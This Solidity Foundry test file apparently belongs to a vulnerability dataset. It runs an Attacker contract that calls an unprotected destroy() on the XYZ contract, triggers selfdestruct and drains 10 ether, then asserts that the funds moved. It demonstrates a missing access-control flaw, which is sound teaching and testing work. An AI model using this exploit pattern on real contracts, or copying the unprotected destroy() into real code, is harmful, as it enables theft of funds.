pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/8.1.3-Missing-verification-for-program-termination-vulnerability.sol";

// This test demonstrates that the XYZ contract is vulnerable to unauthorized termination via its destroy() function.
// An attacker (using the Attacker contract) can trigger selfdestruct on the vulnerable contract, draining its funds.
// We test that after the attack:
//   - The vulnerable contractâ€™s balance is 0 (i.e. funds have been transferred).
//   - The Attacker contract (which is the caller of destroy()) has received the funds.
// Note: Instead of checking the on-chain code-size (which might not update in the testing environment as expected),
// we check the effects on the contract balance to demonstrate the vulnerability.

contract MaliciousAttackTest is Test {
    XYZ vulnerable;
    Attacker attackerContract;
    address attackerEOA = address(0xbEEF);

    // setUp deploys the vulnerable contract and funds it, as well as sets up the attacker contract from a different EOA.
    function setUp() public {
        // deploy the vulnerable contract
        vulnerable = new XYZ();
        
        // Fund the vulnerable contract with 10 ether
        vm.deal(address(vulnerable), 10 ether);
        
        // Also fund the attacker EOA with 1 ether (for gas etc.)
        vm.deal(attackerEOA, 1 ether);
        
        // Deploy the attacker contract from the attacker EOA
        vm.startPrank(attackerEOA);
        attackerContract = new Attacker(address(vulnerable));
        vm.stopPrank();
    }

    function testDestroyVulnerability() public {
        // Record the initial balance of attacker EOA for reference (though funds will be sent to the attacker contract)
        uint256 initialAttackerEOABalance = attackerEOA.balance;
        
        // Attack: From the attacker EOA, call the attack function. Because the Attacker contract calls destroy()
        // on the vulnerable contract, selfdestruct will be triggered and all funds will be transferred to the attacker contract.
        vm.prank(attackerEOA);
        attackerContract.attack();

        // After the attack, the vulnerable contract should have been terminated (selfdestructed) and its funds drained.
        // We verify that its balance is 0.
        assertEq(address(vulnerable).balance, 0, "Vulnerable contract should have 0 balance after selfdestruct");

        // The funds should have been transferred to the caller of destroy(), which in this case is the attacker contract.
        uint256 attackerContractBalance = address(attackerContract).balance;
        assertEq(attackerContractBalance, 10 ether, "Attacker contract should have received 10 ether from selfdestruct");

        // Optionally, if the attacker contract were to forward funds to the attacker EOA, that could be tested here by
        // checking the EOA balance. In this minimal example, the funds remain in the attacker contract.
    }
}
